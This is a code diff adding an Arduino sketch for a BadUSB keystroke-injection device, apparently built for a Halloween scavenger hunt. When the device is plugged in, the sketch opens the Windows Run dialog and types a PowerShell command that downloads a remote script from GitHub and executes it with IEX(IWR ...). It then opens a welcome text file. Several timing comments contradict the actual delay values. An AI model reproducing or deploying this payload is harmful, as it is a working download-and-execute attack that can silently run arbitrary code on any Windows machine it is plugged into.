@@ -1,0 +1,30 @@
+// Here lies the Arduino IDE code in case anyone is worried about the badUSB payload. <3
+#include <Keyboard.h>  // Correct header file for Keyboard library
+
+void setup() {
+  // Start the Keyboard
+  Keyboard.begin();
+
+  // Wait for the system to recognize the USB device
+  delay(20000);  // Reduced from 50,000ms to 3,000ms
+
+  // Open Run dialog (Windows + R)
+  Keyboard.press(KEY_LEFT_GUI);  // Press Windows key
+  delay(300);                     // Reduced from 50ms to 30ms
+  Keyboard.press('r');           // Press 'r' key
+  delay(300);                     // Same as before, safe minimum delay
+  Keyboard.releaseAll();         // Release both keys
+
+  delay(500);  // Delay for Run dialog to open
+
+  // Type "powershell" and press Enter
+  Keyboard.print("powershell IEX(IWR https://raw.githubusercontent.com/escholle/HalloweenScavengerHunt2024/refs/heads/main/Halloween2024F.ps1); cd $env:USERPROFILE\OneDrive\Desktop\; notepad.exe Halloween-Welcome-Page.txt");
+  delay(200);                     // Reduced from 500ms to 200ms
+  Keyboard.press(KEY_RETURN);     // Press Enter
+  delay(100);                      // Reduced from 50ms to 30ms
+  Keyboard.releaseAll();          // Release Enter key
+}
+
+void loop() {
+  // put your main code here, to run repeatedly:
+}
